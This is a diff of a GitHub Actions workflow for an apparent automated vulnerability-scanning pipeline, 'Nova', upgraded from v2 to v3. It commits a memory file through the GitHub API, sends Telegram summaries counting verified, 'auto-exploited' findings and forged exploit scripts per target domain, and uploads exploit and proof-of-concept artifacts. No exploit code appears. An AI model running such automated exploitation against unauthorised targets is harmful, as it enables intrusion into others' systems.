+            PAYLOAD="{\"message\":\"chore: self-learning memory — run ${GITHUB_RUN_ID} (${DATE})\",\"content\":\"${CONTENT}\",\"branch\":\"main\"}"
           fi
-
-          RESULT=$(curl -s -X PUT \
-            -H "Authorization: Bearer $GITHUB_TOKEN" \
+          curl -s -X PUT -H "Authorization: Bearer $GITHUB_TOKEN" \
             -H "Accept: application/vnd.github+json" \
             "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/nova_self_improvement_memory.json" \
-            -d "$PAYLOAD")
+            -d "$PAYLOAD" \
+            | python3 -c "import sys,json; r=json.load(sys.stdin); print('✅ Memory committed' if 'commit' in r else f'Note: {str(r)[:100]}')" 2>/dev/null || true
 
-          echo "$RESULT" | python3 -c "
-          import sys,json
-          r=json.load(sys.stdin)
-          if 'commit' in r: print('✅ Memory committed:', r['commit'].get('html_url',''))
-          elif 'content' in r: print('✅ Memory created')
-          else: print('Response:', str(r)[:200])
-          " 2>/dev/null || true
-
-      # ══════════════════════════════════════════════════════════════════════
-      # 17 — TELEGRAM SUMMARY
-      # ══════════════════════════════════════════════════════════════════════
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 20 — TELEGRAM FINAL SUMMARY
+      # ════════════════════════════════════════════════════════════════════════
       - name: "📱 Telegram — Final summary"
         if: always()
         run: |
           [ -z "$NOVA_TELEGRAM_TOKEN" ] && exit 0
           python3 - <<'PYEOF'
-          import json,os,glob,urllib.request,urllib.parse
+          import json, os, glob, urllib.request, urllib.parse
           from pathlib import Path
           ws      = Path(os.environ['NOVA_WORKSPACE'])
           token   = os.environ['NOVA_TELEGRAM_TOKEN']
           chat_id = os.environ['NOVA_TELEGRAM_CHAT_ID']
           run_url = f"https://github.com/{os.environ.get('GITHUB_REPOSITORY','')}/actions/runs/{os.environ.get('GITHUB_RUN_ID','')}"
 
-          total_v=0; total_r=0; total_s=0; lines=[]
+          total_v=0; total_r=0; total_s=0; total_ae=0; lines=[]
           for fp in glob.glob(str(ws/'fp_filtered'/'verified_*.json')):
             try:
               d=json.load(open(fp)); n=d.get('final_count',0); r=d.get('total_raw',0)
-              sc=len(glob.glob(str(ws/'exploits'/f'exploit_*_{d.get("domain","?")}*.py')))
-              total_v+=n; total_r+=r; total_s+=sc
-              lines.append(f'  • {d.get("domain","?")}: {n} verified, {sc} scripts')
+              ae=sum(1 for f in d.get('findings',[]) if f.get('auto_exploit',{}).get('confirmed'))
+              sc=len(list((ws/'exploits').glob(f'*_{d.get("domain","?")}*.py')))
+              total_v+=n; total_r+=r; total_s+=sc; total_ae+=ae
+              lines.append(f'  • {d.get("domain","?")}: {n} verified | {ae} auto-exploited | {sc} scripts')
             except: pass
 
-          # Load memory stats
           mem_file=ws/'memory'/'priors.json'
-          run_count=0
-          if mem_file.exists():
-            try: run_count=json.loads(mem_file.read_text()).get('run_count',0)
-            except: pass
-
+          run_count=json.loads(mem_file.read_text()).get('run_count',0) if mem_file.exists() else 0
           fp_rate=round((1-total_v/max(total_r,1))*100,1)
-          msg=(f'🦅 Nova v2 Complete (Run #{run_count})\n'
-               f'━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
-               f'✅ Verified:       {total_v}\n'
-               f'🧹 FP filtered:    {total_r-total_v} ({fp_rate}%)\n'
-               f'📜 Scripts forged: {total_s}\n'
-               f'🧬 Memory run:     #{run_count}\n'
+
+          msg=(f'🦅 Nova v3 Complete (Run #{run_count})\n'
+               f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
+               f'✅ Verified:        {total_v}\n'
+               f'🔴 Auto-exploited:  {total_ae}\n'
+               f'🧹 FP filtered:     {total_r-total_v} ({fp_rate}%)\n'
+               f'📜 Scripts forged:  {total_s}\n'
+               f'🧬 Memory run:      #{run_count}\n'
                f'📍 Targets:\n'+'\n'.join(lines)+'\n'
                f'🔗 {run_url}')
-          data=urllib.parse.urlencode({'chat_id':chat_id,'text':msg}).encode()
-          urllib.request.urlopen(f'https://api.telegram.org/bot{token}/sendMessage',data,timeout=10)
+          urllib.request.urlopen(
+            f'https://api.telegram.org/bot{token}/sendMessage',
+            urllib.parse.urlencode({'chat_id':chat_id,'text':msg}).encode(), timeout=10)
           print(msg)
           PYEOF
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 18 — UPLOAD ALL ARTIFACTS
-      # ══════════════════════════════════════════════════════════════════════
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 21 — UPLOAD ALL ARTIFACTS
+      # ════════════════════════════════════════════════════════════════════════
       - name: "📤 Upload all artifacts"
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: nova-v2-results-${{ github.run_id }}
+          name: nova-v3-results-${{ github.run_id }}
           path: |
             /root/nova_workspace/reports/
             /root/nova_workspace/poc/
@@ -1236,6 +1461,8 @@ jobs:
             /root/nova_workspace/plans/
             /root/nova_workspace/hypotheses/
             /root/nova_workspace/exploits/
+            /root/nova_workspace/patches/
+            /root/nova_workspace/synthesis/
             /root/nova_workspace/memory/
           retention-days: 30
           if-no-files-found: warn
